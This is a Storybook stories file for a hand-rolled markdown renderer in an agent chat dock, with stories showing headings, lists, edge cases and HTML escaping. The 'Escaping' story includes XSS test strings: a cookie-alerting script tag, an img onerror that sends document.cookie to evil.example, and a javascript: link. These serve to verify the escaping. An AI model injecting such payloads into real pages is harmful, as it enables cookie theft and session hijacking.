import type { Meta, StoryObj } from "@storybook/html-vite";
import { cls, el } from "../dom";
import { type Caption, dock, plainStage } from "../stories/chrome";
import { renderMarkdown } from "./markdown";

/*
 * The markdown renderer, which is also a security boundary.
 *
 * A deliberate deviation, and the README says so: ~100 lines rather than a
 * dependency, to keep the overlay IIFE small. What that buys has to be weighed
 * against what it risks, and both are visible here.
 *
 * **The security contract is the important story.** Everything is HTML-escaped
 * *before* any transform runs, and only a fixed set of tags is ever emitted — so
 * agent output cannot inject markup into the host page. That is not a property
 * you can see in a screenshot of well-behaved prose, which is exactly why
 * `Escaping` below feeds it the things an LLM will eventually produce: a script
 * tag it read in a file, an `onerror` attribute, a `javascript:` URL. The link
 * rule matches `https?://` only, so the last of those renders as text.
 *
 * **The heading shift is the other non-obvious rule.** `#` becomes `<h4>`, not
 * `<h1>`. Assistant prose sits inside a chat bubble inside a dock, and a level-1
 * heading there would outrank the dock's own title — so every level is pushed
 * down by three and clamped at six.
 */

const meta: Meta = {
  title: "Chat/Markdown",
};

export default meta;

/** Rendered where it is actually read: an assistant bubble in the left dock. */
function bubble(src: string, caption: Caption): HTMLElement {
  return plainStage(
    [
      dock(
        el("div", { class: cls("transcript") }, [
          el("div", { class: `${cls("msg")} ${cls("msg-assistant")}` }, [
            el("div", { class: cls("msg-body"), html: renderMarkdown(src) }),
          ]),
        ]),
        { label: "Agent" }
      ),
    ],
    caption
  );
}

/** Every construct the renderer supports, in one message. */
export const Everything: StoryObj = {
  render: () =>
    bubble(
      `# Top level heading
## Second level
### Third level

I've updated the hero button to use a **larger radius** and the \`blue-600\`
background. The change is in _one_ file.

- Padding is now \`px-6 py-3\`
- Radius went from \`rounded\` to \`rounded-lg\`
- Added a \`:hover\` brightness lift

Steps I took:

1. Found the component with Grep
2. Read the surrounding markup
3. Applied the edit and typechecked

\`\`\`tsx
<button className="rounded-lg px-6 py-3 bg-blue-600 text-white">
  Get started
</button>
\`\`\`

See the [Tailwind docs](https://tailwindcss.com/docs/border-radius) for the
full scale.`,
      {
        try: "check the heading sizes — `#` renders as `<h4>`, because a level-1 heading inside a dock would outrank the dock",
        what: "Headings, both list kinds, inline code, bold, italic, a link and a fenced block.",
      }
    ),
};

/**
 * The security contract, made visible.
 *
 * None of this is hypothetical: an agent that has just read a file full of JSX
 * will quote it back, and a summary of a security fix contains exactly these
 * strings. Everything below is escaped before any rule runs, so it renders as
 * the text it is.
 */
export const Escaping: StoryObj = {
  render: () =>
    bubble(
      `Found the XSS in the comment renderer. The old code passed
<script>alert(document.cookie)</script> straight through, and
<img src=x onerror="fetch('//evil.example/'+document.cookie)"> as well.

I also stripped a [payload](javascript:alert(1)) link — the renderer only
matches \`https?://\`, so that one is not a link at all.

Ampersands & angle brackets <like these> survive as characters.`,
      {
        try: "there should be no image, no alert and no link here — if you see any of the three, the escape pass has a hole",
        what: "Markup an agent will eventually produce, rendered as text. Escaping happens before every transform, not after.",
      }
    ),
};

/**
 * The edges, where a hand-rolled parser earns or loses its keep.
 *
 * An unterminated fence is the common one — a streaming message is unterminated
 * by definition for as long as it is arriving. The placeholder fallback matters
 * because fences are pulled out *before* line parsing and put back after: a
 * placeholder that ends up mid-paragraph rather than on its own line has to
 * render as something rather than leaking `[[PKFENCE:0]]` into the prose.
 */
export const Edges: StoryObj = {
  render: () =>
    bubble(
      `A fence that never closes, which is every streaming message before its
last token arrives:

\`\`\`ts
const x = 1;
const y = 2;

An inline \`\`\`fence\`\`\` in the middle of a sentence.

1. An ordered list

   interrupted by a paragraph

2. and then continued, which restarts the numbering

####### Seven hashes, which is not a heading at all`,
      {
        what: "An unterminated fence, an inline fence, an interrupted ordered list, and a heading past the six-level cap.",
      }
    ),
};
